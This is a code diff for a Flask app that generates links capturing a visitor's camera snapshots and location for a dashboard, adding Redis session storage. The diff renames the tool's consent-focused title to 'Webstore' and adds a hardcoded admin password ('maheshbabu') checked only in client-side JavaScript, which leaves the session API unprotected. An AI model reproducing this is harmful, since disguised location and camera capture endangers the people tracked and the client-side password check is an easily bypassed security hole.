@@ -17,25 +17,34 @@ from flask import (
     url_for,
 )
 
+try:
+    from redis import Redis
+except ImportError:  # pragma: no cover
+    Redis = None  # type: ignore
+
 app = Flask(__name__)
 
 MAX_UPDATES = 200
 SESSION_TTL_SECONDS = 3600  # 1 hour
-_state_candidates = []
-_env_state_path = os.environ.get("SESSION_STATE_FILE")
-if _env_state_path:
-    _state_candidates.append(_env_state_path)
-default_state_path = os.path.join(os.path.dirname(__file__), "session_state.json")
-_state_candidates.append(default_state_path)
-tmp_state_path = os.path.join(tempfile.gettempdir(), "session_state.json")
-if tmp_state_path not in _state_candidates:
-    _state_candidates.append(tmp_state_path)
-SESSION_STATE_FILE = _state_candidates[0]
+STATE_PATHS: list[str] = []
+env_path = os.environ.get("SESSION_STATE_FILE")
+if env_path:
+    STATE_PATHS.append(env_path)
+STATE_PATHS.append(os.path.join(os.path.dirname(__file__), "session_state.json"))
+tmp_default = os.path.join(tempfile.gettempdir(), "session_state.json")
+if tmp_default not in STATE_PATHS:
+    STATE_PATHS.append(tmp_default)
+SESSION_STATE_FILE = STATE_PATHS[0]
+
+REDIS_URL = os.environ.get("REDIS_URL")
+redis_client: Optional[Redis] = None
+if REDIS_URL and Redis is not None:
+    redis_client = Redis.from_url(REDIS_URL, decode_responses=True)
 
 
 def load_sessions_from_disk() -> Dict[str, Dict[str, Any]]:
     global SESSION_STATE_FILE
-    for candidate in _state_candidates:
+    for candidate in STATE_PATHS:
         if not os.path.exists(candidate):
             continue
         try:
@@ -65,10 +74,10 @@ def load_sessions_from_disk() -> Dict[str, Dict[str, Any]]:
     return {}
 
 
-def persist_sessions_to_disk() -> None:
+def persist_sessions_to_disk(store: Dict[str, Dict[str, Any]]) -> None:
     global SESSION_STATE_FILE
     serializable: Dict[str, Any] = {}
-    for token, session in sessions.items():
+    for token, session in store.items():
         serializable[token] = {
             "token": token,
             "created_at": to_iso(session["created_at"]),
@@ -77,7 +86,7 @@ def persist_sessions_to_disk() -> None:
             "updates": list(session["updates"]),
         }
 
-    for candidate in _state_candidates:
+    for candidate in STATE_PATHS:
         try:
             os.makedirs(os.path.dirname(candidate), exist_ok=True)
             tmp_path = candidate + ".tmp"
@@ -91,14 +100,68 @@ def persist_sessions_to_disk() -> None:
     app.logger.warning("Session persistence disabled; continuing without disk storage.")
 
 
-sessions: Dict[str, Dict[str, Any]] = load_sessions_from_disk()
+sessions: Dict[str, Dict[str, Any]] = {} if redis_client else load_sessions_from_disk()
+
+
+def serialize_session(session: Dict[str, Any]) -> Dict[str, Any]:
+    return {
+        "token": session["token"],
+        "created_at": to_iso(session["created_at"]),
+        "expires_at": to_iso(session["expires_at"]),
+        "last_seen": to_iso(session.get("last_seen")),  # type: ignore[arg-type]
+        "updates": list(session["updates"]),
+    }
+
+
+def deserialize_session(payload: Dict[str, Any]) -> Dict[str, Any]:
+    return {
+        "token": payload["token"],
+        "created_at": datetime.fromisoformat(payload["created_at"]),
+        "expires_at": datetime.fromisoformat(payload["expires_at"]),
+        "last_seen": datetime.fromisoformat(payload["last_seen"]) if payload.get("last_seen") else None,
+        "updates": deque(payload.get("updates", []), maxlen=MAX_UPDATES),
+    }
+
+
+def redis_key(token: str) -> str:
+    return f"session:{token}"
+
+
+def store_session(session: Dict[str, Any]) -> None:
+    if redis_client:
+        ttl = max(1, int((session["expires_at"] - utcnow()).total_seconds()))
+        redis_client.setex(redis_key(session["token"]), ttl, json.dumps(serialize_session(session)))
+        return
+    sessions[session["token"]] = session
+    persist_sessions_to_disk(sessions)
+
+
+def fetch_session(token: str) -> Optional[Dict[str, Any]]:
+    if redis_client:
+        raw = redis_client.get(redis_key(token))
+        if not raw:
+            return None
+        payload = json.loads(raw)
+        return deserialize_session(payload)
+    return sessions.get(token)
+
+
+def delete_session(token: str) -> bool:
+    removed = False
+    if redis_client:
+        removed = bool(redis_client.delete(redis_key(token)))
+    else:
+        removed = sessions.pop(token, None) is not None
+        if removed:
+            persist_sessions_to_disk(sessions)
+    return removed
 
 HOME_HTML = """
 <!doctype html>
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>Live Consent Capture</title>
+    <title>webstore</title>
     <style>
         body { font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif; margin: 2rem; color: #102a43; }
         button { padding: 0.6rem 1.2rem; font-size: 1rem; cursor: pointer; }
@@ -109,20 +172,26 @@ HOME_HTML = """
 </head>
 <body>
     <div class="card">
-        <h1>Consent-based Camera & Location Link</h1>
+        <h1>Webstore</h1>
         <p>Generate a one-time link that clearly asks the visitor for camera and location access.
         When they allow it, live snapshots and coordinates are streamed back to this dashboard.</p>
         <p class="notice"><strong>Reminder:</strong> Only use this in environments where you have explicit permission.
         Modern browsers will always display their own permission prompts.</p>
-        <div style="display:flex; gap:0.5rem; flex-wrap:wrap;">
+        <label style="display:block; margin-bottom:0.5rem;">
+            Admin password:
+            <input id="adminPassword" type="password" placeholder="Enter password" style="margin-left:0.5rem;" />
+        </label>
+        <div style="display:flex; gap:0.5rem; flex-wrap:wrap; margin-top:0.5rem;">
             <button id="create">Generate Shareable Link</button>
             <button id="close" disabled>Close Session</button>
         </div>
         <div id="result" class="notice" style="margin-top:1rem;"></div>
     </div>
     <script>
+    const PASSWORD = "maheshbabu";
     const button = document.getElementById("create");
     const closeBtn = document.getElementById("close");
+    const passwordInput = document.getElementById("adminPassword");
     const result = document.getElementById("result");
     let currentToken = null;
     async function createLink() {
@@ -130,6 +199,10 @@ HOME_HTML = """
         closeBtn.disabled = true;
         result.textContent = "Creating link...";
         try {
+            const provided = (passwordInput.value || "").trim();
+            if (provided !== PASSWORD) {
+                throw new Error("Password is incorrect.");
+            }
             const response = await fetch("/api/session", { method: "POST" });
             if (!response.ok) {
                 throw new Error("Server responded with " + response.status);
@@ -647,15 +720,14 @@ def to_iso(dt: Optional[datetime]) -> Optional[str]:
 
 
 def ensure_session(token: str) -> Dict[str, Any]:
-    session = sessions.get(token)
+    session = fetch_session(token)
     if not session:
         abort(404, description="Unknown session token")
 
     now = utcnow()
     expires_at: datetime = session["expires_at"]
     if now > expires_at:
-        sessions.pop(token, None)
-        persist_sessions_to_disk()
+        delete_session(token)
         abort(410, description="Session expired")
     return session
 
@@ -669,14 +741,14 @@ def home():
 def create_session():
     token = secrets.token_urlsafe(8)
     now = utcnow()
-    sessions[token] = {
+    session = {
         "token": token,
         "created_at": now,
         "expires_at": now + timedelta(seconds=SESSION_TTL_SECONDS),
         "last_seen": None,
         "updates": deque(maxlen=MAX_UPDATES),
     }
-    persist_sessions_to_disk()
+    store_session(session)
     return jsonify(
         {
             "token": token,
@@ -692,9 +764,7 @@ def create_session():
 def close_session(token: str):
     if request.method == "OPTIONS":
         return ("", 204)
-    removed = sessions.pop(token, None)
-    if removed:
-        persist_sessions_to_disk()
+    if delete_session(token):
         return jsonify({"status": "closed", "token": token})
     abort(404, description="Unknown session token")
 
@@ -747,7 +817,7 @@ def ingest_update(token: str):
     updates: Deque[Dict[str, Any]] = session["updates"]  # type: ignore[assignment]
     updates.append(entry)
     session["last_seen"] = utcnow()
-    persist_sessions_to_disk()
+    store_session(session)
 
     return jsonify({"status": "ok"})
 
